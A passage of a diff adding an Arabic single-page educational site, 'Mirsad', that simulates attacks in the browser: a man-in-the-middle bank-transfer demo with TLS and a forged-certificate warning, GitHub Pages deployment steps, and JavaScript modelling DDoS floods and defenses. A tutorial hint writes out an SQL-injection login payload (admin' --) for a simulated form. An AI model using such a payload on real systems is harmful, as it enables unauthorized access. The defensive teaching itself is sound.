+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">عالمان: متصل وغير متصل</div><div class="f-d"><b>متصل</b>: يحميك القفل والاختناق والتحقق بخطوتين (جرّب المختبر يميناً) · <b>غير متصل</b>: المهاجم يجزّئ تجزئتك على عتاده بلا قيود — يوقفه فقط بطء الخوارزمية (<span class="mono" dir="ltr">bcrypt/argon2</span>) وطول كلمتك.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">القواميس قبل القوة</div><div class="f-d">أول ما يُجرَّب: ملايين كلمات المرور المسرّبة تاريخياً وتحويلاتها الشائعة. «إضافة رقم بالآخر» و«استبدال a بـ @» حيل يعرفها الجميع — كلمات المرور الفريدة الطويلة فقط تخرج من القاموس إلى القوة الغاشمة.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> قوة كلمة المرور أُسّية: حرفان إضافيان مع تنوّع قد ينقلانك من دقيقة إلى قرن. وفي الطرف المقابل، قفلٌ بعد خمس محاولات يحوّل مهمة ثوانٍ إلى ساعات. كلا الجانبين رياضيات صرفة — والرياضيات، بخلاف الناس، لا تجامل أحداً.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 06 · المنتصف ============ -->
+  <section class="module" id="mod-mitm" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 06 / 06</span></div>
+    <h2 class="mod-title">المستمع في المنتصف <span class="en" dir="ltr">MITM</span></h2>
+    <p class="mod-lead">بينك وبين بنكك مسارٌ قد يحمله مستمع — نقطة واي فاي عامة، أو جهازٌ في شبكتك. أرسل حوالة وشاهد ما تلتقطه <b>عين المنتصف</b>. ثم فعّل TLS وراقبها تعمى… إلا إذا ضغطتَ «تجاهل» بيدك أنت — فالقرار الأخير دائماً بشري.</p>
+
+    <div class="panel">
+      <div class="p-head">مسرح الحوالة — أرسل وراقب العين <span class="p-tag" dir="ltr">LIVE</span></div>
+      <svg id="mSvg" class="stage" viewBox="0 0 1000 300">
+        <line x1="148" y1="110" x2="852" y2="110" class="wire"/>
+        <text x="835" y="86" class="dirhint" text-anchor="end">‹ حوالتك الصادرة</text>
+        <g id="mTlsBadge" style="display:none">
+          <rect x="466" y="42" width="68" height="20" rx="3" class="stbox" style="stroke:rgba(91,190,142,.55)"/>
+          <text x="500" y="56" class="stTxt" style="fill:var(--grn);font-family:var(--mono);font-size:10px" text-anchor="middle">TLS 1.3</text>
+        </g>
+        <g transform="translate(120,110)">
+          <rect x="-34" y="-46" width="68" height="46" rx="4" class="node"/>
+          <line x1="-24" y1="-32" x2="-24" y2="0" class="ndet"/>
+          <line x1="-8" y1="-32" x2="-8" y2="0" class="ndet"/>
+          <line x1="8" y1="-32" x2="8" y2="0" class="ndet"/>
+          <line x1="24" y1="-32" x2="24" y2="0" class="ndet"/>
+          <line x1="-34" y1="0" x2="34" y2="0" class="ndet"/>
+          <text x="0" y="24" class="nlab" text-anchor="middle">بنكك</text>
+          <text x="0" y="40" class="nsub" text-anchor="middle" dir="ltr">bank.example</text>
+        </g>
+        <g transform="translate(880,110)">
+          <rect x="-22" y="-14" width="44" height="28" rx="3" class="node"/>
+          <line x1="-28" y1="14" x2="28" y2="14" class="ndet"/>
+          <line x1="-14" y1="20" x2="14" y2="20" class="ndet"/>
+          <text x="0" y="44" class="nlab" text-anchor="middle">أنت</text>
+        </g>
+        <g id="mEyeG" transform="translate(500,110)">
+          <g id="mEye" class="m-eye">
+            <ellipse rx="27" ry="15" class="eyeball"/>
+            <circle r="6" class="pupil"/>
+            <circle cx="-9" cy="-5" r="2" class="glint"/>
+          </g>
+          <line x1="0" y1="16" x2="0" y2="62" class="ndet"/>
+          <rect x="-52" y="62" width="104" height="30" rx="3" class="botbody"/>
+          <text x="0" y="81" class="nsub" text-anchor="middle" style="fill:#E8767A">المهاجم — في المسار</text>
+          <text x="0" y="112" class="nsub" text-anchor="middle">واي فاي عام · أو جهاز داخل شبكتك</text>
+        </g>
+        <g id="mPkts"></g>
+      </svg>
+      <div class="m-ctrl">
+        <div class="grp"><span class="lab">TLS / HTTPS</span><div class="sw" id="mTlsSw"><i></i></div></div>
+        <button class="btn on" id="mSend">أرسل حوالة 500</button>
+        <button class="btn" id="mReset">إعادة ضبط الجلسة</button>
+      </div>
+      <div id="mState">بلا TLS — كل ما ترسله نصٌّ صريح يمرّ أمام العين مباشرة.</div>
+      <div id="mWarn">
+        <div class="mw-head"><span style="width:18px;height:18px;background:var(--red);color:#1A0B0C;font:700 12px var(--mono);display:flex;align-items:center;justify-content:center;flex:none">!</span>تحذير أمان: شهادة الخادم غير موثوقة</div>
+        <div class="mw-body">الشهادة صادرة عن <span class="mono">CN=mitm-example</span> — وهي ليست شهادة <span class="mono">bank.example</span> الحقيقية. هذا يعني أن أحداً في المسار ينتحل البنك ويحاول فكّ تشفيرك. قرارك الآن يحدد كل ما بعده.</div>
+        <div class="mw-actions">
+          <button class="mw-safe">الأمان أولاً — رفض وخروج</button>
+          <button class="mw-bad">تجاهل الخطر والمتابعة</button>
+        </div>
+      </div>
+      <div class="logbox" id="mLog"><div class="cap"><span class="ct" dir="ltr">--:--:--</span><span class="chipx c-dim">لا التقاطات بعد — أرسل حوالة</span></div></div>
+      <div id="mKnow"><span class="k">ما يعرفه المهاجم الآن:</span><span class="chipx c-dim">لا شيء</span></div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">يستمع، لا يخترق</div><div class="f-d">يحتاج فقط أن يكون <b>في المسار</b>: نقطة واي فاي عامة، جهاز مصاب في الشبكة، أو مشغّل خبيث لبوابة. لا يكسر شيئاً — يقرأ ما يمرّ فوق رأسه، ولهذا اسمه «المستمع».</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">TLS يهزمه هزيمة تامة — تقنياً</div><div class="f-d">التشفير طرفية-طرفية يجعل ما يمرّ أمام العين <b>عشوائيةً بلا معنى</b>. حيلة المهاجم الوحيدة حينها: شهادة مزوّورة تُنبّه المتصفح — وتنتظر قرارك أنت.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">آخر خط دفاع آلي: HSTS</div><div class="f-d">يربط الموقع بتشفيره سجلاً دائماً في المتصفح، فيمنع «الإرجاع الصامت» إلى HTTP — لكنه لا يحمي من قرارٍ واعٍ بتجاهل تحذير شهادة. جرّبتَ أعلاه الفرق بين الحالتين.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> TLS أقوى حلقة في السلسلة كلها — وأضعفها المستخدم الذي يضغط «متابعة على أي حال». التحذير الذي تجاوزتَه بيدك في المختبر أعلاه هو نفسه الذي يفتح البنك للمستمع في الواقع: التشفير لا يُهزم رياضياً، يُتجاوَل بشرياً فقط.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ النشر ============ -->
+  <section class="panel" id="deploy">
+    <div class="p-head">انشر الموقع بنفسك — GitHub Pages في 4 خطوات <span class="p-tag" dir="ltr">DEPLOY</span></div>
+    <div class="dep-steps">
+      <div class="dep-step"><span class="n" dir="ltr">01</span><div><div class="t">أنشئ مستودعاً باسمك الخاص</div><div class="d">على GitHub: مستودع جديد باسم <code>username.github.io</code> (استبدل username باسم حسابك) — هذا الاسم يمنحك عنواناً مباشراً بلا مسار. أي مستودع آخر يعمل أيضاً عبر إعدادات Pages.</div></div></div>
+      <div class="dep-step"><span class="n" dir="ltr">02</span><div><div class="t">احفظ الكود باسم index.html وارفعه</div><div class="d">انسخ كود هذه الصفحة كاملاً إلى ملف اسمه <code>index.html</code> ثم ارفعه للمستودع (زر Add file → Upload files). لا حاجة لأي بناء أو حزم — الملف مكتفٍ بذاته.</div></div></div>
+      <div class="dep-step"><span class="n" dir="ltr">03</span><div><div class="t">فعّل Pages من الإعدادات</div><div class="d">Settings ← Pages ← Branch: اختر <code>main</code> والجذر <code>/ (root)</code> ثم Save. خلال دقيقة أو دقيقتين يُبنى الموقع تلقائياً.</div></div></div>
+      <div class="dep-step"><span class="n" dir="ltr">04</span><div><div class="t">موقعك حيّ</div><div class="d">افتح <code>https://username.github.io</code> — شارك الرابط مع من تشاء. كل تعديل تدفعه إلى main يحدّث الموقع خلال دقيقة.</div></div></div>
+    </div>
+    <div class="dep-code"><span class="c"># أو بالأوامر من جهازك:</span>
+git init
+git add index.html
+git commit -m "مِرصاد: موسوعة تفاعلية لتشريح الهجمات — تعليم دفاعي"
+git branch -M main
+git remote add origin https://github.com/USERNAME/USERNAME.github.io.git
+git push -u origin main</div>
+    <div class="dep-note">
+      <b style="color:var(--acc)">لماذا يعيش هذا القانونياً على GitHub؟</b> لأنه لا يحوي أداة هجوم واحدة ولا كود استغلال قابل للاستخدام: كل الأهداف وهمية (نطاقات example ونطاقات التوثيق)، وكل «هجوم» محاكاة رقمية تعرض مفهوماً دفاعياً.
+      أضف ملف <span class="mono" dir="ltr">README.md</span> يشرح هدف المشروع التعليمي و<span class="mono" dir="ltr">LICENSE</span> (MIT مثلاً)، ليكتمل مظهر المستودع الناضج. ولتوسيعه: كل وحدة في الكود معزولة بقسمها الخاص — انسخ قالب أي وحدة، غيّر المحتوى والمنطق، وأضف سطراً للفهرس: هكذا تولد «التشريح 07».
+    </div>
+  </section>
+
+  <footer>
+    مِرصاد — موسوعة تفاعلية تعليمية دفاعية. ملف واحد، بلا خوادم، بلا أدوات هجوم: كل الأهداف وهمية وكل المحاكاة تجري داخل متصفحك.<br>
+    الهجمات الحقيقية على أنظمة لا تملكها أو تفويضاً مكتوباً بها جريمة جنائية — وهنا نشرحها لنمنعها، لا لنرتكبها.
+  </footer>
+</div>
+
+<div id="toast"></div>
+
+<script>
+(function(){
+'use strict';
+const $=s=>document.querySelector(s), $$=s=>document.querySelectorAll(s);
+const ns='http://www.w3.org/2000/svg';
+const rnd=(a,b)=>a+Math.random()*(b-a);
+const pick=a=>a[Math.floor(Math.random()*a.length)];
+const RM=matchMedia('(prefers-reduced-motion: reduce)').matches;
+const nowT=()=>{const d=new Date();return[d.getHours(),d.getMinutes(),d.getSeconds()].map(v=>String(v).padStart(2,'0')).join(':');};
+const fmtN=n=>Math.round(n).toLocaleString('en-US');
+const esc=s=>String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+let toastT;
+function toast(msg,kind){const t=$('#toast');t.textContent=msg;t.className='show'+(kind==='warn'?' warn':'');clearTimeout(toastT);toastT=setTimeout(()=>t.className='',5600);}
+const RESIZERS=[];
+function tween(el,x0,y0,x1,y1,dur){return new Promise(res=>{if(RM||dur<=0){el.setAttribute('transform',`translate(${x1},${y1})`);return res();}const t0=performance.now();(function f(t){const k=Math.min(1,(t-t0)/dur),e=k<.5?2*k*k:1-Math.pow(-2*k+2,2)/2;el.setAttribute('transform',`translate(${x0+(x1-x0)*e},${y0+(y1-y0)*e})`);k<1?requestAnimationFrame(f):res();})(t0);});}
+
+/* ============ التنقل ============ */
+const HINTS={
+  'mod-ddos':'ابدأ: أطلق SYN flood بوضع DDoS وشاهد أي مورد ينهار أولاً — ثم شغّل «كعكات SYN» أثناء الهجوم.',
+  'mod-phish':'في هذا البريد 6 مؤشرات تصيّد. مرّر فوق أي جزء يريبك واضغط عليه لكشفه.',
+  'mod-sqli':'اكتب في حقل المستخدم: admin\' --  ثم اضغط دخول — وراقب سطر الاستعلام يتشوه حرفاً حرفاً.',
+  'mod-xss':'اضغط «جرّب حقنة جاهزة» ثم انشر — وبعدها فعّل مفتاح التصريف في الأعلى وأعد المحاولة.',
+  'mod-brute':'اكتب كلمة مرور تجريبية في الحاسبة (كل شيء محلي) — أو ابدأ هجوم الرقم السري مباشرة.',
+  'mod-mitm':'أرسل حوالة بلا TLS أولاً وشاهد ما تلتقطه العين — ثم فعّله وواجه قرار الشهادة المزوّرة.'
+};
+const HINTED={};
+function openMod(id){
+  $$('.module').forEach(m=>m.hidden=true);
+  if(id){
+    $('#'+id).hidden=false;$('#hero').hidden=true;$('#catalog').hidden=true;
+    if(!HINTED[id]){HINTED[id]=true;toast(HINTS[id]);}
+    requestAnimationFrame(()=>RESIZERS.forEach(f=>f()));
+  }else{$('#hero').hidden=false;$('#catalog').hidden=false;}
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+ $$('.cat-row[data-mod]').forEach(r=>{
+  const go=()=>openMod(r.dataset.mod);
+  r.addEventListener('click',go);
+  r.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();go();}});
+});
+ $$('.back').forEach(b=>b.addEventListener('click',()=>openMod(null)));
+/* شرطات الخطورة في الفهرس */
+ $$('.cat-sev').forEach(s=>{
+  const n=+s.dataset.s;
+  for(let i=0;i<5;i++){const d=document.createElement('span');if(i<n)d.className='f'+(n>=5?' hot':'');s.appendChild(d);}
+});
+
+/* ============ 01 · الإغراق ============ */
+(function(){
+  const S={mode:'ddos',vector:'syn',bots:200,attacking:false,def:{rl:false,ck:false,js:false,cdn:false},bw:80,conn:0,cpu:6,state:'ok',downT:0,upT:0,avail:.99,ah:[],legAcc:0,toastDown:false};
+  const DT=.25,LEGIT=80,CONN_CAP=512,CPU_CAP=400;
+  const VECS={syn:{n:'SYN flood',t:'جدول الاتصالات'},http:{n:'HTTP flood',t:'المعالج'},udp:{n:'UDP flood',t:'عرض النطاق'},amp:{n:'تضخيم DNS',t:'النطاق ×35'}};
+  const bwCap=()=>S.def.cdn?10000:1000;
+  const stage=$('#dStage'),pktsG=$('#dPkts');
+  const ip=()=>pick(['203.0.113.','198.51.100.','192.0.2.'])+Math.floor(rnd(2,250));
+
+  function rawAttack(){
+    if(!S.attacking)return null;
+    if(S.mode==='dos'){
+      switch(S.vector){case 'udp':return{mbps:220};case 'syn':return{syn:60};case 'http':return{rps:300};case 'amp':return{mbps:220*35,amp:true};}
+    }else{
+      const n=S.bots;
+      switch(S.vector){case 'udp':return{mbps:n*3};case 'syn':return{syn:n*.9};case 'http':return{rps:n*1.5};case 'amp':return{mbps:n*.9*35,amp:true};}
+    }
+  }
+  function effective(){
+    const raw=rawAttack();if(!raw)return{mbps:0,syn:0,rps:0};
+    let{mbps=0,syn=0,rps=0}=raw;const d=S.def;
+    if(!raw.amp&&d.rl&&S.mode==='dos'){mbps=Math.min(mbps,25);rps=Math.min(rps,8);syn=Math.min(syn,5);}
+    if(d.ck)syn=0;
+    if(d.js)rps*=.05;
+    if(d.cdn){mbps*=.35;syn*=.02;rps*=.6;}
+    return{mbps,syn,rps};
+  }
+  /* عناصر المسرح */
+  const tg=$('#dTicks');
+  for(let x=120;x<=1100;x+=50){const l=document.createElementNS(ns,'line');l.setAttribute('x1',x);l.setAttribute('x2',x);l.setAttribute('y1',272);l.setAttribute('y2',280);l.setAttribute('class','tick');tg.appendChild(l);}
+  const BOTS=[[955,68],[1015,58],[1075,70],[1130,80],[978,104],[1038,100],[1098,112],[1148,106],[1000,138],[1120,142]];
+  const bh=$('#dBots');
+  BOTS.forEach(b=>{const g=document.createElementNS(ns,'g');g.setAttribute('transform',`translate(${b[0]},${b[1]})`);g.innerHTML='<rect x="-12" y="-9" width="24" height="17" rx="2" class="botbody"/><line x1="0" y1="8" x2="0" y2="13" class="ndet"/><line x1="-7" y1="15" x2="7" y2="15" class="ndet"/><circle cx="7" cy="-4" r="2" class="botled"/>';bh.appendChild(g);});
+  const USERS=[[1000,240],[1060,240],[1120,240],[1170,240]];
+  const uh=$('#dUsers');
+  USERS.forEach(u=>{const g=document.createElementNS(ns,'g');g.setAttribute('transform',`translate(${u[0]},${u[1]})`);g.innerHTML='<circle cx="0" cy="-13" r="5.5" class="userbody"/><path d="M-11 6 Q-11 -5 0 -5 Q11 -5 11 6 Z" class="userbody"/>';uh.appendChild(g);});
+
+  const pkts=[];
+  function mkPkt(html){const g=document.createElementNS(ns,'g');g.innerHTML=html;pktsG.appendChild(g);return g;}
+  function launchPkt(el,x0,y0,tx,ty,spd,kind,extra){pkts.push(Object.assign({el,x0,y0,tx,ty,p:0,len:Math.max(1,Math.hypot(tx-x0,ty-y0)),spd,kind,dying:false,op:1,dy:0,x:x0,y:y0},extra||{}));}
+  function atkSource(){return S.mode==='dos'?[1060,92]:pick(BOTS);}
+  function pulse(x,y,red,r){const c=document.createElementNS(ns,'circle');c.setAttribute('cx',x);c.setAttribute('cy',y);c.setAttribute('r',r||30);c.setAttribute('class','pulse '+(red?'p-red':'p-grn'));stage.appendChild(c);setTimeout(()=>c.remove(),750);}
+  function floatText(x,y,txt,cls){const t=document.createElementNS(ns,'text');t.setAttribute('x',x);t.setAttribute('y',y);t.setAttribute('text-anchor','middle');t.setAttribute('class','ft '+cls);t.textContent=txt;stage.appendChild(t);setTimeout(()=>t.remove(),1100);}
+  function spawnAttack(){
+    const[sx,sy]=atkSource();let html='';
+    if(S.vector==='syn')html='<path d="M-6 0 L0 -6 L6 0 L0 6 Z" class="pk-syn"/>';
+    else if(S.vector==='http')html='<rect x="-7" y="-5" width="14" height="10" rx="1.5" class="pk-udp"/><line x1="-4" y1="-1.5" x2="4" y2="-1.5" class="pl"/><line x1="-4" y1="2" x2="2" y2="2" class="pl"/>';
+    else html='<circle r="5" class="pk-udp"/>';
+    launchPkt(mkPkt(html),sx,sy,228,116+rnd(-14,14),rnd(170,260),'atk');
+  }
+  function spawnQuery(){const[sx,sy]=atkSource();launchPkt(mkPkt('<circle r="3.5" class="pk-ampq"/>'),sx,sy,620,80,rnd(200,280),'query');}
+  function spawnBig(){launchPkt(mkPkt('<rect x="-9" y="-6.5" width="18" height="13" rx="2" class="pk-ampb"/><line x1="-5" y1="-2" x2="5" y2="-2" class="pl"/><line x1="-5" y1="1.5" x2="3" y2="1.5" class="pl"/>'),620,80+rnd(-5,5),228,118+rnd(-14,14),rnd(150,210),'atk');}
+  let uIdx=0;
+  function spawnLegit(){const u=USERS[uIdx++%USERS.length];launchPkt(mkPkt('<circle r="5" class="pk-legit"/>'),u[0],u[1]-8,228,215,rnd(150,200),'leg',{ux:u[0],uy:u[1]});}
+  function arrival(p){
+    if(p.kind==='query'){pulse(620,80,true,22);spawnBig();if(Math.random()<.5)spawnBig();return;}
+    if(p.kind==='leg'){
+      if(S.state==='down'){pulse(228,215,true);floatText(p.ux,p.uy-30,'TIMEOUT','ft-red');}
+      else{pulse(228,215,false);if(Math.random()<.22)floatText(236,200,'200 OK','ft-grn');}
+      return;
+    }
+    pulse(228,p.ty,true);
+    if(S.vector==='syn'&&Math.random()<.14)floatText(240,84,'SYN','ft-red');
+    else if(S.vector==='http'&&Math.random()<.14)floatText(240,84,'GET /','ft-red');
+    else if(S.vector==='amp'&&Math.random()<.2)floatText(240,84,'×35','ft-red');
+  }
+  let bwOver=false,last=performance.now();
+  function frame(t){
+    const dt=Math.min(.05,(t-last)/1000);last=t;
+    for(let i=pkts.length-1;i>=0;i--){
+      const p=pkts[i];
+      if(p.dying){p.dy+=dt*34;p.op-=dt*2.2;if(p.op<=0){pkts.splice(i,1);p.el.remove();continue;}p.el.setAttribute('transform',`translate(${p.x.toFixed(1)},${(p.y+p.dy).toFixed(1)})`);p.el.style.opacity=p.op.toFixed(2);continue;}
+      p.p+=p.spd*dt/p.len;
+      if(p.p>=1){arrival(p);pkts.splice(i,1);p.el.remove();continue;}
+      p.x=p.x0+(p.tx-p.x0)*p.p;p.y=p.y0+(p.ty-p.y0)*p.p;
+      if(bwOver&&p.kind!=='query'&&p.p>.5&&Math.random()<dt*.9){p.dying=true;continue;}
+      p.el.setAttribute('transform',`translate(${p.x.toFixed(1)},${p.y.toFixed(1)})`);
+    }
+    requestAnimationFrame(frame);
+  }
+  requestAnimationFrame(frame);
+
+  function addLog(chips){
+    const log=$('#dLog'),row=document.createElement('div');row.className='cap';
+    let h=`<span class="ct" dir="ltr">${nowT()}</span>`;
+    chips.forEach(([t,c])=>h+=`<span class="chipx ${c}" dir="auto">${t}</span>`);
+    row.innerHTML=h;log.prepend(row);
+    while(log.children.length>7)log.lastChild.remove();
+  }
+  /* نبض المحاكاة */
+  const CV={};
+  function setupAvail(){
+    const cv=$('#dAvailC'),r=cv.getBoundingClientRect();if(r.width<2)return;
+    const d=Math.min(2,window.devicePixelRatio||1);
+    cv.width=Math.round(r.width*d);cv.height=Math.round(r.height*d);
+    const c=cv.getContext('2d');c.setTransform(d,0,0,d,0,0);CV.c=c;CV.w=r.width;CV.h=r.height;
+  }
+  RESIZERS.push(setupAvail);
+  window.addEventListener('resize',setupAvail);
+  function drawAvail(){
+    if(!CV.c)return;const{c,w,h}=CV;c.clearRect(0,0,w,h);
+    c.strokeStyle='rgba(255,255,255,.08)';c.beginPath();c.moveTo(0,h-1);c.lineTo(w,h-1);c.stroke();
+    c.strokeStyle='rgba(255,255,255,.1)';c.setLineDash([3,5]);const y95=h-3-.95*(h-8);c.beginPath();c.moveTo(0,y95);c.lineTo(w,y95);c.stroke();c.setLineDash([]);
+    const d=S.ah;if(d.length<2)return;
+    const col=S.avail>.95?'#5BBE8E':S.avail>.7?'#F2A93B':'#E5484D';
+    c.strokeStyle=col;c.lineWidth=1.4;c.beginPath();
+    d.forEach((v,i)=>{const x=i/(d.length-1)*w,y=h-3-v*(h-8);i?c.lineTo(x,y):c.moveTo(x,y);});
+    c.stroke();c.fillStyle=col;c.beginPath();c.arc(w-2,h-3-S.avail*(h-8),2.2,0,7);c.fill();
+  }
+  function setBar(bar,val,cap){const r=Math.min(1,val/cap);bar.style.width=(r*100).toFixed(1)+'%';bar.classList.toggle('hot',r>.85);}
+  function updateHUD(){
+    const cap=bwCap();
+    $('#dBw').innerHTML=fmtN(S.bw)+' <small>/ '+fmtN(cap)+' Mbps</small>';setBar($('#dBwB'),S.bw,cap);
+    $('#dConn').innerHTML=fmtN(S.conn)+' <small>/ 512</small>';setBar($('#dConnB'),S.conn,CONN_CAP);
+    $('#dCpu').innerHTML=fmtN(S.cpu)+' <small>/ 400 req/s</small>';setBar($('#dCpuB'),S.cpu,CPU_CAP);
+    $('#dAvail').innerHTML=(S.avail*100).toFixed(1)+'<small>%</small>';
+    $('#dAvail').className='v-val '+(S.avail>.95?'v-grn':S.avail>.7?'v-acc':'v-red');
+    drawAvail();
+    stage.classList.remove('s-ok','s-warn','s-down');stage.classList.add('s-'+S.state);
+    const chip=$('#dStChip');chip.setAttribute('class','stChip st-'+S.state);
+    $('#dStTxt').textContent={ok:'سليم',warn:'مُجهد',down:'ساقط'}[S.state];
+    $('#dSbState').textContent='الخادم: '+{ok:'سليم',warn:'مُجهد — يترنّح',down:'ساقط — انقطاع خدمة'}[S.state];
+    $('#dSbState').className='st '+(S.state==='ok'?'t-ok':S.state==='warn'?'t-warn':'t-down');
+    const atk=$('#dSbAtk');
+    if(S.attacking){atk.textContent='هجوم نشط: '+(S.mode==='dos'?'DoS — جهاز واحد':'DDoS — '+fmtN(S.bots)+' بوت')+' · '+VECS[S.vector].n;atk.className='red';}
+    else{atk.textContent='هدوء — حركة شرعية فقط';atk.className='grn';}
+    $('#dSbDef').textContent='الدفاعات النشطة: '+Object.values(S.def).filter(Boolean).length+'/4';
+    $('#dSrvSub').textContent=S.def.cdn?'origin.example · خلف CDN — سعة 10 Gbps':'origin.example · أنبوب 1 Gbps مكشوف';
+  }
+  function tick(){
+    const eff=effective(),cap=bwCap();
+    S.bw+=((eff.mbps+LEGIT)-S.bw)*.4;if(S.bw<0)S.bw=0;
+    if(S.attacking)S.conn+=eff.syn*DT;
+    const tau=S.def.ck?4:(S.attacking?18:6);
+    S.conn=Math.max(0,S.conn-S.conn*DT/tau);
+    S.cpu+=((eff.rps+6)-S.cpu)*.35;if(S.cpu<0)S.cpu=0;
+    const rB=S.bw/cap,rC=S.conn/CONN_CAP,rP=S.cpu/CPU_CAP,maxR=Math.max(rB,rC,rP);
+    bwOver=rB>.96;
+    if(maxR>=.999){S.downT+=DT;S.upT=0;}else{S.upT+=DT;S.downT=0;}
+    if(S.state!=='down'){
+      if(S.downT>=1){
+        S.state='down';
+        const cause=rB>=1?'عرض النطاق':(rC>=1?'جدول الاتصالات':'المعالج');
+        addLog([['DOWN','c-red'],['تجاوز '+cause+' 100% — الخدمة توقفت عن المستخدمين الشرعيين','c-red']]);
+        if(!S.toastDown){S.toastDown=true;toast('الخادم سقط: '+cause+' غرق بالمطالب. لاحظ TIMEOUT تنهمر على المستخدمين الخُضر — ثم انزل لغرفة الدفاع وشغّل ما يناسب هذا النوع بالتحديد.','warn');}
+      }else S.state=maxR>.7?'warn':'ok';
+    }else if(S.upT>=2&&maxR<.85){
+      S.state=maxR>.7?'warn':'ok';
+      addLog([['UP','c-acc'],['الموارد عادت تحت 85% — الخادم يستقبل من جديد','c-acc']]);
+      if(S.attacking&&S.toastDown)toast('إنقاذ ناجح: الخادم يستقبل مستخدميه والهجوم مستمر — هذا حرفياً ما تبيعه أنظمة anti-DDoS: سعة وتصفية بالنيابة عنك.');
+      S.toastDown=false;
+    }
+    const tgt=S.state==='down'?0:(S.state==='warn'?.84+rnd(0,.08):.99+rnd(0,.009));
+    S.avail+=(tgt-S.avail)*.25;
+    S.ah.push(S.avail);if(S.ah.length>140)S.ah.shift();
+    if(!RM&&pkts.length<80){
+      if(S.attacking){
+        if(S.vector==='amp'){if(Math.random()<.75)spawnQuery();}
+        else{let n=S.mode==='ddos'?(S.bots>=500?3:(S.bots>=150?2:1)):1;if(S.vector==='udp'&&S.bots>=800)n=4;for(let i=0;i<n;i++)spawnAttack();}
+      }
+      S.legAcc+=DT;if(S.legAcc>=.55){S.legAcc=0;spawnLegit();}
+    }
+    updateHUD();
+  }
+  setInterval(tick,250);
+
+  function part(o){const a=[];if(o.mbps)a.push(fmtN(o.mbps)+' Mbps'+(o.amp?' ×35':''));if(o.syn)a.push(fmtN(o.syn)+' SYN/s');if(o.rps)a.push(fmtN(o.rps)+' req/s');return a.join(' · ')||'صفر';}
+  function updatePower(){
+    const el=$('#dPower');
+    if(!S.attacking){el.innerHTML='الهجوم متوقف — الأنبوب (1 Gbps) يستوعب حركة المستخدمين (<span class="mono" dir="ltr">80 Mbps</span>) بهدوء.';return;}
+    const raw=rawAttack(),eff=effective();
+    const th=S.vector==='syn'?'عتبة الجدول: 512 فتحة':S.vector==='http'?'عتبة المعالج: 400 req/s':'عتبة النطاق: '+fmtN(bwCap())+' Mbps';
+    el.innerHTML='القوة الخام: <b class="pw-raw" dir="ltr">'+part(raw)+'</b> — بعد الدفاعات: <b class="pw-eff" dir="ltr">'+part(eff)+'</b><br><span style="color:var(--dim)">'+th+'</span>';
+  }
+  $$('#dMode button').forEach(b=>b.addEventListener('click',()=>{
+    if(S.mode===b.dataset.m)return;S.mode=b.dataset.m;
+    $$('#dMode button').forEach(x=>x.classList.toggle('on',x===b));
+    $('#dBotsG').style.display=S.mode==='ddos'?'':'none';
+    $('#dDos').style.display=S.mode==='dos'?'':'none';
+    $('#dSliderRow').classList.toggle('dis',S.mode==='dos');
+    addLog([['MODE','c-dim'],[S.mode==='dos'?'مصدر واحد — قاعدة حجب واحدة تُنهيه':'جيش موزّع — كل بوت «تحت الحد» بمفرده','c-dim']]);
+    updatePower();updateHUD();
+  }));
+  $$('#dVec button').forEach(b=>b.addEventListener('click',()=>{
+    if(S.vector===b.dataset.v)return;S.vector=b.dataset.v;
+    $$('#dVec button').forEach(x=>x.classList.toggle('on',x===b));
+    $('#dRefl').style.display=S.vector==='amp'?'':'none';
+    addLog([['WEAPON','c-red'],['السلاح: '+VECS[S.vector].n+' — يستهدف: '+VECS[S.vector].t,'c-red']]);
+    updatePower();updateHUD();
+  }));
+  $('#dSlider').addEventListener('input',e=>{
+    S.bots=+e.target.value;$('#dBotVal').textContent=fmtN(S.bots);
+    $('#dBotTxt').textContent=fmtN(S.bots)+' جهاز تحت الأمر';updatePower();
+  });
+  $('#dLaunch').addEventListener('click',()=>{
+    S.attacking=!S.attacking;
+    const btn=$('#dLaunch');btn.classList.toggle('armed',S.attacking);
+    btn.textContent=S.attacking?'إيقاف الهجوم':'إطلاق الهجوم — محاكاة محلية';
+    addLog(S.attacking
+      ?[['LAUNCH','c-red'],['إطلاق '+(S.mode==='dos'?'DoS من جهاز واحد':'DDoS من '+fmtN(S.bots)+' بوت')+' · '+VECS[S.vector].n,'c-red']]
+      :[['STOP','c-acc'],['أُوقف الهجوم — الخادم يلتقط أنفاسه والجدول يفرغ خلال ثوانٍ','c-acc']]);
+    updatePower();updateHUD();
+  });
+  /* الدفاعات */
+  const DEFS=[
+    {id:'rl',code:'RATE-LIMIT',name:'قصّ لكل عنوان IP',desc:'أي مصدر يتجاوز حداً يُقصّ عند الحافة. قاتل ضد جهاز واحد — أعمى أمام جيش كلٌّ منه «تحت الحد».',on:'قصّ فوري لأي مصدر فوق الحد',off:'كل مصدر يمرّ بحرية',lgOn:['RATE-LIMIT','أي مصدر فوق 25 Mbps / 8 rps يُقصّ فوراً'],lgOff:['RATE-LIMIT','أُطفئ — الباب مفتوح لكل مصدر']},
+    {id:'ck',code:'SYN COOKIE',name:'كعكات SYN',desc:'لا حجز ذاكرة قبل إكمال المصافحة — الحالة تُرمَّز داخل رقم التسلسل نفسه. حل أنيق لهجوم واحد بالضبط.',on:'هجوم SYN يسقط أثره إلى الصفر',off:'كل SYN يحجز فتحة انتظاراً لـ ACK لن يأتي',lgOn:['SYN COOKIE','الحالة في رقم التسلسل — بلا حجز ذاكرة'],lgOff:['SYN COOKIE','أُطفئ — عاد حجز الفتحات لكل SYN']},
